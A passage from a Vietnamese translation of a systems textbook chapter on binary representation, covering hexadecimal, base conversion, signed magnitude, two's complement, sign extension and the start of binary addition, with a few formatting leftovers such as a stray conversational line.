<p>Với hai hệ cơ số vốn đã tốt, bạn có thể tự hỏi tại sao cần thêm một hệ nữa. Câu trả lời chủ yếu là <strong>vì sự tiện lợi</strong>. Như đã thấy ở <a href="C4-Binary/bases.html#TabBinaryCounting">Bảng 1</a>, các dãy bit (bit sequences) trong nhị phân nhanh chóng trở nên rất dài. Con người thường gặp khó khăn khi đọc các chuỗi dài chỉ gồm 0 và 1. Trong khi đó, hệ thập phân gọn hơn, nhưng cơ số 10 lại không khớp với cơ số 2 của nhị phân.</p>
<p>Hệ thập phân cũng không dễ dàng biểu diễn phạm vi giá trị có thể thể hiện bằng một số lượng bit cố định. Ví dụ, giả sử một máy tính cũ sử dụng địa chỉ bộ nhớ (memory address) 16-bit. Các địa chỉ hợp lệ của nó trải từ <strong>0b0000000000000000</strong> đến <strong>0b1111111111111111</strong>. Nếu biểu diễn ở hệ thập phân, các địa chỉ này sẽ từ 0 đến 65535. Rõ ràng, biểu diễn thập phân gọn hơn so với chuỗi nhị phân dài, nhưng trừ khi bạn thuộc lòng cách chuyển đổi, việc suy luận từ số thập phân sẽ khó hơn. Cả hai vấn đề này còn nghiêm trọng hơn trên các thiết bị hiện đại, vốn dùng địa chỉ 32-bit hoặc 64-bit.</p>
<p>Chính ở những chuỗi bit dài này mà hệ thập lục phân (base 16) phát huy ưu thế. Cơ số lớn cho phép mỗi chữ số biểu diễn nhiều thông tin hơn, giúp số hexadecimal gọn hơn. Hơn nữa, vì cơ số 16 là lũy thừa của 2 ($2^4 = 16$), việc ánh xạ giữa hexadecimal và binary (và ngược lại) trở nên dễ dàng. Để đầy đủ, hãy phân tích hệ thập lục phân tương tự như đã làm với thập phân và nhị phân:</p>
<ol>
<li>
<p>Mỗi chữ số trong một số ở cơ số 16 lưu trữ một trong 16 giá trị duy nhất. Việc có hơn 10 giá trị tạo ra một thách thức mới cho hexadecimal — các chữ số truyền thống của cơ số 10 dừng ở giá trị tối đa là 9. Theo quy ước, hexadecimal dùng các chữ cái để biểu diễn giá trị lớn hơn 9: A cho 10, B cho 11, …, F cho 15. Giống như các hệ khác, để lưu trữ giá trị lớn hơn 15, số phải <strong>carry</strong> sang một chữ số bổ sung bên trái. Ví dụ, nếu một chữ số đang ở giá trị tối đa (F) và ta cộng thêm 1, kết quả sẽ cần hai chữ số:<br />
<strong>0xF + 0x1 = 0x10</strong> (lưu ý: tiền tố <strong>0x</strong> được dùng để chỉ số hexadecimal).</p>
</li>
<li>
<p>Vị trí của mỗi chữ số trong số quyết định tầm quan trọng của nó đối với giá trị tổng thể. Đánh số các chữ số từ <em>phải sang trái</em> là d0, d1, d2, …, mỗi chữ số kế tiếp đóng góp một hệ số gấp 16 lần chữ số liền kề bên phải.</p>
</li>
</ol>
<p>Không có gì ngạc nhiên, công thức quen thuộc để diễn giải một con số cũng áp dụng cho hexadecimal, chỉ khác là cơ số là 16:</p>
<p>$$(d_{N-1} \times 16^{N-1}) + (d_{N-2} \times 16^{N-2}) + \dots + (d_2 \times 16^2) + (d_1 \times 16^1) + (d_0 \times 16^0)$$</p>
<p>Ví dụ, để xác định giá trị thập phân của <strong>0x23C8</strong>:</p>
<p>$$(2 \times 16^3) + (3 \times 16^2) + (C \times 16^1) + (8 \times 16^0)$$<br />
$$(2 \times 16^3) + (3 \times 16^2) + (12 \times 16^1) + (8 \times 16^0)$$<br />
$$(2 \times 4096) + (3 \times 256) + (12 \times 16) + (8 \times 1)$$<br />
$$= 8192 + 768 + 192 + 8 = 9160$$</p>
<p><strong>Hiểu lầm thường gặp về hexadecimal</strong></p>
<p>Khi mới học lập trình hệ thống (systems programming), bạn có thể không thường xuyên gặp số hexadecimal. Thực tế, ngữ cảnh phổ biến nhất là khi biểu diễn địa chỉ bộ nhớ (memory address). Ví dụ, nếu bạn in địa chỉ của một biến bằng <strong><code>%p</code></strong> (pointer) trong hàm <code>printf</code>, bạn sẽ nhận được kết quả ở dạng hexadecimal.</p>
<p>Nhiều sinh viên thường bắt đầu đồng nhất địa chỉ bộ nhớ (ví dụ: biến con trỏ trong C) với hexadecimal. Mặc dù bạn sẽ quen với việc thấy địa chỉ được biểu diễn theo cách này, hãy nhớ rằng <strong>chúng vẫn được lưu trữ ở dạng nhị phân trong phần cứng</strong>, giống như mọi dữ liệu khác.</p>
<h3 id="414-giới-hạn-lưu-trữ-storage-limitations"><a class="header" href="#414-giới-hạn-lưu-trữ-storage-limitations">4.1.4. Giới hạn lưu trữ (Storage Limitations)</a></h3>
<p>Về mặt khái niệm, tồn tại vô hạn các <strong>unsigned integers</strong> (số nguyên không dấu). Tuy nhiên, trong thực tế, lập trình viên phải chọn số lượng <strong>bits</strong> dành cho một biến <em>trước khi</em> lưu trữ nó, vì nhiều lý do:</p>
<ul>
<li>
<p>Trước khi lưu trữ một giá trị, chương trình phải cấp phát không gian lưu trữ cho giá trị đó. Trong C, việc khai báo một biến sẽ cho <strong>compiler</strong> (trình biên dịch) biết <a href="C4-Binary/getting_started.html#_c_numeric_types">lượng bộ nhớ</a> cần thiết dựa trên kiểu dữ liệu của biến.</p>
</li>
<li>
<p>Các thiết bị lưu trữ phần cứng có dung lượng hữu hạn. Trong khi <strong>main memory</strong> (bộ nhớ chính) của hệ thống thường lớn và hiếm khi là yếu tố giới hạn, thì các vị trí lưu trữ bên trong CPU được dùng làm vùng &quot;scratch space&quot; (bộ nhớ tạm thời), tức là <a href="C4-Binary/storagecircs.html#_cpu_register">registers</a>, lại bị hạn chế hơn nhiều. CPU sử dụng các register bị giới hạn bởi <strong>word size</strong> (độ dài từ) của nó — thường là 32 hoặc 64 bits, tùy thuộc vào <strong>CPU architecture</strong> (kiến trúc CPU).</p>
</li>
<li>
<p>Các chương trình thường di chuyển dữ liệu từ một thiết bị lưu trữ sang thiết bị khác (ví dụ: giữa CPU registers và main memory). Khi giá trị dữ liệu lớn hơn, các thiết bị lưu trữ cần nhiều dây dẫn hơn để truyền tín hiệu giữa chúng. Do đó, việc mở rộng dung lượng lưu trữ sẽ làm tăng độ phức tạp của phần cứng và giảm không gian vật lý dành cho các thành phần khác.</p>
</li>
</ul>
<p>Số lượng bits được dùng để lưu trữ một số nguyên quyết định phạm vi giá trị mà nó có thể biểu diễn. <a href="C4-Binary/bases.html#FigUnsignedLine">Hình 2</a> minh họa cách chúng ta có thể hình dung không gian lưu trữ số nguyên không dấu vô hạn và hữu hạn.</p>
<p><img src="C4-Binary/_images/UnsignedLine.png" alt="The infinite unsigned number line starts at zero and increases infinitely.  The finite unsigned number line starts at 0 and ends at a maximum value.  Attempting to move off one end wraps around to the other." /></p>
<p><strong>Hình 2.</strong> Minh họa (a) trục số nguyên không dấu vô hạn và (b) trục số nguyên không dấu hữu hạn. Trường hợp hữu hạn sẽ &quot;quay vòng&quot; (wrap around) tại hai đầu mút (hiện tượng <strong>overflow</strong>).</p>
<p>Cố gắng lưu trữ một giá trị lớn hơn khả năng chứa của biến được gọi là <strong>integer overflow</strong> (tràn số nguyên). Chương này sẽ để phần chi tiết về overflow ở <a href="C4-Binary/overflow.html#_integer_overflow">mục sau</a>. Hiện tại, bạn có thể hình dung nó giống như đồng hồ đo quãng đường (odometer) của ô tô: khi đạt giá trị tối đa và tăng thêm, nó sẽ &quot;quay vòng&quot; trở lại 0. Tương tự, nếu trừ 1 từ 0, ta sẽ nhận được giá trị lớn nhất.</p>
<p>Tại thời điểm này, một câu hỏi tự nhiên về <strong>unsigned binary</strong> (nhị phân không dấu) là: &quot;<em>Giá trị dương lớn nhất mà N bits có thể lưu trữ là bao nhiêu?</em>&quot;<br />
Nói cách khác, nếu có một dãy <em>N</em> bits đều bằng 1, thì dãy đó biểu diễn giá trị nào?<br />
Lý luận một cách không hình thức, phân tích ở <a href="C4-Binary/index.html#_binary_and_data_representation">mục trước</a> cho thấy <em>N</em> bits tạo ra $2^N$ dãy bit khác nhau. Vì một trong số đó phải biểu diễn số 0, nên còn lại $2^N - 1$ giá trị dương, từ 1 đến $2^N - 1$. Do đó, giá trị lớn nhất của một số nhị phân không dấu <em>N</em> bits là $2^N - 1$.</p>
<p>Ví dụ: 8 bits tạo ra $2^8 = 256$ dãy bit khác nhau. Một trong số đó, <strong>0b00000000</strong>, được dành cho giá trị 0, để lại 255 dãy cho các giá trị dương. Vì vậy, một biến 8-bit có thể biểu diễn các giá trị dương từ 1 đến 255, trong đó giá trị lớn nhất là <strong>255</strong>.</p>
<div style="break-before: page; page-break-before: always;"></div><p>Ok Khánh 👍</p>
<h2 id="42-chuyển-đổi-giữa-các-hệ-cơ-số-converting-between-bases"><a class="header" href="#42-chuyển-đổi-giữa-các-hệ-cơ-số-converting-between-bases">4.2. Chuyển đổi giữa các hệ cơ số (Converting Between Bases)</a></h2>
<p>Bạn sẽ thường xuyên gặp cả ba hệ cơ số mà chúng ta đã giới thiệu trong chương này ở nhiều ngữ cảnh khác nhau.<br />
Trong một số trường hợp, bạn sẽ cần chuyển đổi từ một hệ cơ số sang hệ khác.<br />
Phần này bắt đầu bằng việc chỉ ra cách chuyển đổi giữa <strong>binary</strong> (nhị phân) và <strong>hexadecimal</strong> (thập lục phân), vì hai hệ này có mối liên hệ trực tiếp.<br />
Sau đó, chúng ta sẽ tìm hiểu cách chuyển đổi sang và từ <strong>decimal</strong> (thập phân).</p>
<h3 id="421-chuyển-đổi-giữa-binary-và-hexadecimal"><a class="header" href="#421-chuyển-đổi-giữa-binary-và-hexadecimal">4.2.1. Chuyển đổi giữa Binary và Hexadecimal</a></h3>
<p>Vì cơ số của cả binary và hexadecimal đều là lũy thừa của 2, việc chuyển đổi giữa chúng khá đơn giản.<br />
Cụ thể, mỗi chữ số hexadecimal biểu diễn một trong 16 giá trị khác nhau, và bốn bit cũng biểu diễn (2^4 = 16) giá trị khác nhau, nên chúng có khả năng biểu diễn tương đương.<br />
Bảng 1 liệt kê ánh xạ một-một giữa mọi nhóm 4 bit và một chữ số hexadecimal.</p>
<div class="table-wrapper"><table><thead><tr><th>Binary</th><th>Hexadecimal</th><th></th><th>Binary</th><th>Hexadecimal</th></tr></thead><tbody>
<tr><td>0000</td><td>0</td><td></td><td>1000</td><td>8</td></tr>
<tr><td>0001</td><td>1</td><td></td><td>1001</td><td>9</td></tr>
<tr><td>0010</td><td>2</td><td></td><td>1010</td><td>A</td></tr>
<tr><td>0011</td><td>3</td><td></td><td>1011</td><td>B</td></tr>
<tr><td>0100</td><td>4</td><td></td><td>1100</td><td>C</td></tr>
<tr><td>0101</td><td>5</td><td></td><td>1101</td><td>D</td></tr>
<tr><td>0110</td><td>6</td><td></td><td>1110</td><td>E</td></tr>
<tr><td>0111</td><td>7</td><td></td><td>1111</td><td>F</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Ánh xạ giữa tất cả các nhóm 4 bit và một chữ số hexadecimal.</p>
<p>Lưu ý rằng nội dung của Bảng 1 chỉ đơn giản là đếm từ 0 đến 15 ở cả hai hệ cơ số, nên bạn không cần phải ghi nhớ.<br />
Dựa vào bảng này, bạn có thể chuyển đổi bất kỳ số lượng bit hoặc chữ số hex liên tiếp nào theo cả hai hướng:</p>
<ul>
<li><strong>Ví dụ 1:</strong> Chuyển 0xB491 sang binary: thay thế từng chữ số hex bằng giá trị binary tương ứng.</li>
</ul>
<blockquote>
<pre><code>  B    4    9    1
1011 0100 1001 0001  -&gt;  0b1011010010010001
</code></pre>
</blockquote>
<ul>
<li><strong>Ví dụ 2:</strong> Chuyển 0b1111011001 sang hexadecimal: chia các bit thành nhóm 4 từ <strong>phải sang trái</strong>.<br />
Nếu nhóm bên trái không đủ 4 bit, thêm các số 0 ở đầu. Sau đó thay thế bằng giá trị hex tương ứng.</li>
</ul>
<blockquote>
<pre><code>1111011001  -&gt;  11 1101 1001  -&gt;  0011 1101 1001
                                    ^ padding

0011 1101 1001
  3    D    9  -&gt;  0x3D9
</code></pre>
</blockquote>
<h3 id="422-chuyển-đổi-sang-decimal"><a class="header" href="#422-chuyển-đổi-sang-decimal">4.2.2. Chuyển đổi sang Decimal</a></h3>
<p>Thực tế, việc chuyển đổi sang decimal chính là những gì chúng ta đã làm trong <a href="C4-Binary/bases.html#_unsigned_binary_numbers">các phần trước</a>.<br />
Với một số ở <strong>bất kỳ</strong> cơ số <strong>B</strong> nào, đánh số các chữ số từ <strong>phải sang trái</strong> là d~0~, d~1~, d~2~, … cho phép áp dụng công thức tổng quát:</p>
<blockquote>
<p>((d_{N-1} \times B^{N-1}) + (d_{N-2} \times B^{N-2}) + \dots + (d_2 \times B^2) + (d_1 \times B^1) + (d_0 \times B^0))</p>
</blockquote>
<h3 id="423-chuyển-đổi-từ-decimal"><a class="header" href="#423-chuyển-đổi-từ-decimal">4.2.3. Chuyển đổi từ Decimal</a></h3>
<p>Chuyển đổi từ decimal sang hệ khác cần nhiều bước hơn.<br />
Về nguyên tắc, đây là quá trình ngược lại của công thức trên: xác định giá trị của từng chữ số sao cho tổng của chúng (theo vị trí) bằng số decimal ban đầu.<br />
Bạn có thể hình dung mỗi chữ số trong hệ đích giống như các hàng đơn vị, hàng chục, hàng trăm… trong hệ thập phân.</p>
<p><strong>Ví dụ:</strong> Chuyển từ decimal sang hexadecimal.<br />
Mỗi chữ số hex tương ứng với một lũy thừa của 16.<br />
Bảng 2 liệt kê một số lũy thừa đầu tiên của 16.</p>
<div class="table-wrapper"><table><thead><tr><th>16⁴</th><th>16³</th><th>16²</th><th>16¹</th><th>16⁰</th></tr></thead><tbody>
<tr><td>65536</td><td>4096</td><td>256</td><td>16</td><td>1</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Lũy thừa của 16.</p>
<p><strong>Ví dụ:</strong> Chuyển <strong>9742</strong> sang hexadecimal:</p>
<ol>
<li>
<p><strong>65536</strong> không vừa trong 9742 → d~4~ = 0.<br />
Các chữ số cao hơn cũng bằng 0.</p>
</li>
<li>
<p><strong>4096</strong> vừa 2 lần → d~3~ = 2.<br />
Còn lại: 9742 − 8192 = 1550.</p>
</li>
<li>
<p><strong>256</strong> vừa 6 lần → d~2~ = 6.<br />
Còn lại: 1550 − 1536 = 14.</p>
</li>
<li>
<p><strong>16</strong> không vừa → d~1~ = 0.</p>
</li>
<li>
<p><strong>1</strong> vừa 14 lần → d~0~ = E (14 trong hex).</p>
</li>
</ol>
<p>Kết quả: <strong>0x260E</strong>.</p>
<h4 id="decimal-sang-binary-lũy-thừa-của-2"><a class="header" href="#decimal-sang-binary-lũy-thừa-của-2">Decimal sang Binary: Lũy thừa của 2</a></h4>
<p>Quy trình tương tự áp dụng cho binary, chỉ cần dùng lũy thừa của 2.<br />
Bảng 3 liệt kê một số lũy thừa đầu tiên của 2.</p>
<div class="table-wrapper"><table><thead><tr><th>2⁸</th><th>2⁷</th><th>2⁶</th><th>2⁵</th><th>2⁴</th><th>2³</th><th>2²</th><th>2¹</th><th>2⁰</th></tr></thead><tbody>
<tr><td>256</td><td>128</td><td>64</td><td>32</td><td>16</td><td>8</td><td>4</td><td>2</td><td>1</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 3.</strong> Lũy thừa của 2.</p>
<p><strong>Ví dụ:</strong> Chuyển <strong>422</strong> sang binary:</p>
<ul>
<li>256 vừa → d~8~ = 1, còn 166.</li>
<li>128 vừa → d~7~ = 1, còn 38.</li>
<li>64 không vừa → d~6~ = 0.</li>
<li>32 vừa → d~5~ = 1, còn 6.</li>
<li>16 không vừa → d~4~ = 0.</li>
<li>8 không vừa → d~3~ = 0.</li>
<li>4 vừa → d~2~ = 1, còn 2.</li>
<li>2 vừa → d~1~ = 1, còn 0.</li>
<li>1 không vừa → d~0~ = 0.</li>
</ul>
<p>Kết quả: <strong>0b110100110</strong>.</p>
<h4 id="decimal-sang-binary-chia-liên-tiếp"><a class="header" href="#decimal-sang-binary-chia-liên-tiếp">Decimal sang Binary: Chia liên tiếp</a></h4>
<p>Một phương pháp khác không cần biết trước lũy thừa của 2:<br />
Liên tục chia số decimal cho 2 (lấy phần nguyên), mỗi lần ghi lại <strong>0</strong> nếu số chẵn, <strong>1</strong> nếu số lẻ.<br />
Các bit được tạo từ <strong>phải sang trái</strong>.<br />
Khi kết quả chia bằng 0, quá trình kết thúc.</p>
<p><strong>Ví dụ:</strong> 422</p>
<ul>
<li>422 chẵn → d~0~ = 0</li>
<li>211 lẻ → d~1~ = 1</li>
<li>105 lẻ → d~2~ = 1</li>
<li>52 chẵn → d~3~ = 0</li>
<li>26 chẵn → d~4~ = 0</li>
<li>13 lẻ → d~5~ = 1</li>
<li>6 chẵn → d~6~ = 0</li>
<li>3 lẻ → d~7~ = 1</li>
<li>1 lẻ → d~8~ = 1 → chia tiếp được 0 → dừng.</li>
</ul>
<p>Kết quả: <strong>0b110100110</strong> (giống phương pháp trước).</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="43-số-nguyên-nhị-phân-có-dấu-signed-binary-integers"><a class="header" href="#43-số-nguyên-nhị-phân-có-dấu-signed-binary-integers">4.3. Số nguyên nhị phân có dấu (Signed Binary Integers)</a></h2>
<p>Cho đến giờ, chúng ta mới chỉ giới hạn việc thảo luận về số nhị phân ở dạng <strong>unsigned</strong> (chỉ gồm các số không âm).<br />
Phần này giới thiệu một cách diễn giải khác của nhị phân để biểu diễn cả số âm.<br />
Vì biến có dung lượng lưu trữ hữu hạn, một cách code hóa nhị phân có dấu phải phân biệt được giữa số âm, số 0 và số dương.<br />
Việc thao tác với số có dấu cũng đòi hỏi một <strong>procedure</strong> (thủ tục) để thực hiện phép phủ định (negation).</p>
<p>Một cách code hóa nhị phân có dấu phải chia tập hợp các chuỗi bit thành hai nhóm: số âm và số không âm.<br />
Trong thực tế, các nhà thiết kế hệ thống thường xây dựng hệ thống <strong>general-purpose</strong> (đa dụng), nên việc chia đôi 50% / 50% là lựa chọn cân bằng.<br />
Vì vậy, các cách code hóa số có dấu được trình bày trong chương này sẽ biểu diễn số lượng giá trị âm và không âm bằng nhau.</p>
<blockquote>
<p><strong>Lưu ý:</strong> Có sự khác biệt tinh tế nhưng quan trọng giữa <em>non-negative</em> (không âm) và <em>positive</em> (dương).<br />
Tập hợp số dương loại trừ số 0, trong khi tập hợp số không âm bao gồm cả 0.<br />
Ngay cả khi chia đều 50% số chuỗi bit cho số âm và số không âm, vẫn cần dành một giá trị không âm để biểu diễn số 0.<br />
Do đó, với số bit cố định, hệ thống số có thể biểu diễn nhiều số âm hơn số dương (ví dụ: trong hệ <strong>two’s complement</strong>).</p>
</blockquote>
<p>Các cách code hóa số có dấu sử dụng <strong>một bit</strong> để phân biệt giữa nhóm số âm và nhóm số không âm.<br />
Theo quy ước, <strong>bit ngoài cùng bên trái</strong> cho biết số đó là âm (1) hay không âm (0).<br />
Bit này được gọi là <strong>high-order bit</strong> hoặc <strong>most significant bit</strong>.</p>
<p>Chương này sẽ giới thiệu hai cách code hóa số có dấu: <strong>signed magnitude</strong> và <strong>two’s complement</strong>.<br />
Mặc dù chỉ có <strong>two’s complement</strong> còn được sử dụng trong thực tế, việc so sánh cả hai sẽ giúp minh họa các đặc điểm quan trọng.</p>
<h3 id="431-signed-magnitude"><a class="header" href="#431-signed-magnitude">4.3.1. Signed Magnitude</a></h3>
<p><strong>Signed magnitude</strong> coi bit cao nhất chỉ là bit dấu.<br />
Nghĩa là, giá trị tuyệt đối của số được xác định bởi các bit còn lại, còn bit dấu chỉ quyết định số đó là dương (bit dấu = 0) hay âm (bit dấu = 1).<br />
So với <strong>two’s complement</strong>, signed magnitude giúp việc chuyển đổi sang thập phân và phủ định số trở nên đơn giản hơn:</p>
<ul>
<li>Để tính giá trị thập phân của một chuỗi signed magnitude <em>N</em> bit:<br />
Tính giá trị của các bit từ d~0~ đến d~N-2~ theo cách <strong>unsigned</strong>.<br />
Sau đó kiểm tra bit cao nhất d~N-1~: nếu là 1 → số âm, nếu là 0 → số không âm.</li>
<li>Để phủ định một giá trị: chỉ cần đảo bit cao nhất.</li>
</ul>
<blockquote>
<p><strong>Hiểu lầm thường gặp:</strong><br />
Signed magnitude được trình bày ở đây chỉ nhằm mục đích giảng dạy.<br />
Một số máy tính cũ (ví dụ: <a href="https://en.wikipedia.org/wiki/IBM_7090">IBM 7090</a> những năm 1960) từng sử dụng, nhưng không hệ thống hiện đại nào dùng signed magnitude để biểu diễn số nguyên (mặc dù cơ chế tương tự vẫn được dùng trong chuẩn lưu trữ <a href="https://en.wikipedia.org/wiki/Single-precision_floating-point_format">floating-point</a>).<br />
Trừ khi được yêu cầu rõ ràng, <strong>không nên</strong> giả định rằng việc đảo bit đầu tiên sẽ phủ định giá trị của một số trên hệ thống hiện đại.</p>
</blockquote>
<p>Hình 1 cho thấy cách các chuỗi signed magnitude 4-bit tương ứng với giá trị thập phân.<br />
Thoạt nhìn, signed magnitude có vẻ đơn giản, nhưng nó có hai nhược điểm lớn:</p>
<ol>
<li>Có <strong>hai cách biểu diễn số 0</strong>: 0b0000 (0) và 0b1000 (-0).<br />
Điều này gây khó khăn cho phần cứng vì phải xử lý hai chuỗi bit khác nhau nhưng giá trị bằng nhau.</li>
<li>Có <strong>điểm gián đoạn</strong> giữa số âm và số 0.<br />
Ví dụ: trong signed magnitude 4-bit, 0b1111 (-7) + 1 sẽ “quay vòng” thành 0b0000 (0) thay vì -6, gây nhầm lẫn.</li>
</ol>
<p><img src="C4-Binary/_images/SignedMagnitude.png" alt="A circle with non-negative values on one side ranging from 0b0000 (0) to 0b0111 (7). The other side holds 0b1000 (-0) to 0b1111 (-7)." /></p>
<p><strong>Hình 1.</strong> Cách sắp xếp giá trị signed magnitude với chuỗi bit dài 4.</p>
<p>Vì những lý do này, signed magnitude hầu như biến mất trong thực tế, nhường chỗ cho <strong>two’s complement</strong>.</p>
<h3 id="432-twos-complement"><a class="header" href="#432-twos-complement">4.3.2. Two’s Complement</a></h3>
<p><strong>Two’s complement</strong> giải quyết các vấn đề của signed magnitude một cách gọn gàng.<br />
Giống signed magnitude, bit cao nhất cho biết số đó là âm hay không âm.<br />
Tuy nhiên, trong two’s complement, bit này <strong>cũng tham gia vào giá trị tuyệt đối</strong> của số.</p>
<p>Cách tính giá trị thập phân của một số two’s complement <em>N</em> bit tương tự như cách <strong>unsigned</strong>,<br />
nhưng <strong>bit cao nhất được tính với giá trị âm</strong>:<br />
Thay vì đóng góp (d_{N-1} \times 2^{N-1}), nó đóng góp (-d_{N-1} \times 2^{N-1}).<br />
Do đó, nếu bit cao nhất là 1 → giá trị âm (vì nó đóng góp giá trị tuyệt đối lớn nhất và mang dấu âm).<br />
Công thức đầy đủ:</p>
<blockquote>
<p><strong>-</strong>(d~N-1~ × 2^(N-1)) + (d~N-2~ × 2^(N-2)) + … + (d~1~ × 2^1) + (d~0~ × 2^0)</p>
</blockquote>
<p>Hình 2 minh họa cách sắp xếp các giá trị two’s complement 4-bit.<br />
Cách này chỉ có <strong>một cách biểu diễn số 0</strong> (tất cả bit = 0).<br />
Two’s complement biểu diễn được <strong>nhiều số âm hơn số dương</strong>: với 4-bit, min = 0b1000 (-8), max = 0b0111 (7).<br />
Điều này không gây khó khăn cho phần cứng và hiếm khi ảnh hưởng đến ứng dụng.</p>
<p><img src="C4-Binary/_images/TwosComplement.png" alt="A circle with non-negative values on one side ranging from 0b0000 (0) to 0b0111 (7). The other side holds 0b1111 (-1) to 0b1000 (-8)." /></p>
<p><strong>Hình 2.</strong> Cách sắp xếp giá trị two’s complement với chuỗi bit dài 4.</p>
<p>Two’s complement cũng giúp việc chuyển đổi giữa số âm và số 0 trở nên đơn giản:<br />
Bất kể số bit, chuỗi toàn bit 1 luôn là -1, và -1 + 1 sẽ “quay vòng” thành 0.</p>
<h4 id="phủ-định-negation"><a class="header" href="#phủ-định-negation">Phủ định (Negation)</a></h4>
<p>Phủ định một số two’s complement phức tạp hơn signed magnitude một chút.<br />
Để phủ định giá trị <em>N</em> bit X, tìm <strong>bổ sung</strong> của nó so với (2^N) (đây là nguồn gốc tên gọi two’s complement).<br />
Nói cách khác, tìm Y sao cho (X + Y = 2^N).</p>
<p>Cách nhanh trong thực tế: <strong>đảo tất cả các bit rồi cộng thêm 1</strong>.</p>
<p>Ví dụ: phủ định số 13 (8-bit):</p>
<ol>
<li>13 = 0b00001101</li>
<li>Đảo bit → 0b11110010</li>
<li>Cộng 1 → 0b11110011 (theo công thức two’s complement, giá trị = -13)</li>
</ol>
<blockquote>
<p><strong>Lập trình C với số signed và unsigned:</strong><br />
Khi khai báo <code>int</code>, trình biên dịch hiểu là số nguyên signed two’s complement.<br />
Nếu muốn unsigned, khai báo <code>unsigned int</code>.<br />
Sự khác biệt này cũng quan trọng khi in giá trị với <code>printf</code>:</p>
<pre><code class="language-c">printf(&quot;%d  %u\n&quot;, example, example);
</code></pre>
<p>Nếu <code>example = -100</code>, kết quả sẽ là <code>-100  4294967196</code>.</p>
</blockquote>
<h4 id="mở-rộng-dấu-sign-extension"><a class="header" href="#mở-rộng-dấu-sign-extension">Mở rộng dấu (Sign Extension)</a></h4>
<p>Đôi khi, bạn sẽ cần thực hiện phép toán giữa hai số có số bit lưu trữ khác nhau.<br />
Ví dụ, trong C, bạn có thể muốn cộng một <code>int</code> 32-bit với một <code>short</code> 16-bit.<br />
Trong những trường hợp như vậy, số nhỏ hơn cần được <strong>mở rộng dấu</strong> (sign extension) — tức là lặp lại <strong>bit có trọng số cao nhất</strong> của nó đủ số lần để kéo dài chuỗi bit thành độ dài mong muốn.<br />
Trong C, trình biên dịch sẽ tự động xử lý việc này, nhưng hiểu cơ chế hoạt động vẫn rất hữu ích.</p>
<p>Ví dụ:</p>
<ul>
<li>
<p>Mở rộng chuỗi 4-bit <code>0b0110</code> (6) thành chuỗi 8-bit:<br />
Lấy bit cao nhất (0) và chèn thêm bốn số 0 vào đầu → <code>0b00000110</code> (vẫn là 6).</p>
</li>
<li>
<p>Mở rộng chuỗi 4-bit <code>0b1011</code> (-5) thành chuỗi 8-bit:<br />
Lấy bit cao nhất (1) và chèn thêm bốn số 1 vào đầu → <code>0b11111011</code> (vẫn là -5).</p>
</li>
</ul>
<p>Để kiểm chứng, hãy xem giá trị thay đổi thế nào khi thêm từng bit mới:</p>
<pre><code>0b1011     =  -8  + 0  + 2 + 1  =  -5
0b11011    = -16 + 8  + 0 + 2 + 1  =  -5
0b111011   = -32 + 16 + 8 + 0 + 2 + 1  =  -5
0b1111011  = -64 + 32 + 16 + 8 + 0 + 2 + 1  =  -5
0b11111011 = -128 + 64 + 32 + 16 + 8 + 0 + 2 + 1  =  -5
</code></pre>
<p>Như bạn thấy, số <strong>không âm</strong> (bit cao nhất = 0) vẫn giữ nguyên là không âm khi thêm các bit 0 vào đầu.<br />
Tương tự, số <strong>âm</strong> (bit cao nhất = 1) vẫn giữ nguyên là âm khi thêm các bit 1 vào đầu.</p>
<blockquote>
<p><strong>Zero extension cho số unsigned</strong><br />
Với giá trị <strong>unsigned</strong> (ví dụ: biến C khai báo với từ khóa <code>unsigned</code>), việc mở rộng thành chuỗi bit dài hơn sẽ dùng <strong>zero extension</strong> (mở rộng bằng số 0), vì kiểu unsigned không bao giờ được hiểu là số âm.<br />
Zero extension đơn giản là thêm các bit 0 vào đầu chuỗi bit.<br />
Ví dụ: <code>0b1110</code> (14 khi hiểu là unsigned) sẽ được mở rộng thành <code>0b00001110</code> dù bit đầu tiên ban đầu là 1.</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h2 id="44-binary-integer-arithmetic"><a class="header" href="#44-binary-integer-arithmetic">4.4. Binary Integer Arithmetic</a></h2>
<p>Having presented binary representations for <a href="C4-Binary/bases.html#_unsigned_binary_numbers">unsigned</a> and <a href="C4-Binary/signed.html#_signed_binary_integers">signed</a> integers, we're ready to use them in arithmetic operations. Fortunately, due to their encoding, it <em>does not matter</em> to the arithmetic procedures whether wechoose to interpret the operands or result as signed or unsigned. This observation is great news for hardware designers because it allows them to build one set of hardware components that can be shared for both unsigned and signed operations. The <a href="C4-Binary/../C5-Arch/circuits.html#_circuits">hardware chapter</a> describes the circuitry for performing arithmetic in more detail.</p>
<p>Luckily, the same pencil-and-paper algorithms you learned in gradeschool for performing arithmetic on decimal numbers also work for binary numbers. Though the hardware might not compute them in exactly the same way, you should at least be able to make sense of the calculations.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="441-phép-cộng-addition"><a class="header" href="#441-phép-cộng-addition">4.4.1. Phép cộng (Addition)</a></h1>
<p>Hãy nhớ rằng trong một số nhị phân, mỗi chữ số chỉ có thể là 0 hoặc 1.<br />
Do đó, khi cộng hai bit mà <em>cả hai</em> đều bằng 1, kết quả sẽ <strong>carry out</strong> (tạo số nhớ) sang chữ số kế tiếp (ví dụ: (1 + 1 = 0b10), cần hai bit để biểu diễn).<br />
Trong thực tế, các chương trình cộng các biến nhiều bit, trong đó kết quả <strong>carry out</strong> của một chữ số sẽ ảnh hưởng đến chữ số tiếp theo thông qua <strong>carry in</strong> (số nhớ vào).</p>
<p>Nói chung, khi cộng các chữ số từ hai số nhị phân (<em>A</em> và <em>B</em>), sẽ có <strong>tám</strong> khả năng xảy ra tùy thuộc vào giá trị của <em>Digit~A~</em>, <em>Digit~B~</em>, và <strong>Carry~in~</strong> từ chữ số trước.<br />
Bảng 1 liệt kê tám khả năng có thể xảy ra khi cộng một cặp bit. Cột <strong>Carry~in~</strong> chỉ số nhớ được đưa vào từ chữ số trước, và cột <strong>Carry~out~</strong> cho biết việc cộng cặp bit này có tạo số nhớ sang chữ số tiếp theo hay không.</p>
<div class="table-wrapper"><table><thead><tr><th>Digit~A~</th><th>Digit~B~</th><th>Carry~in~</th><th>Result (Sum)</th><th>Carry~out~</th></tr></thead><tbody>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
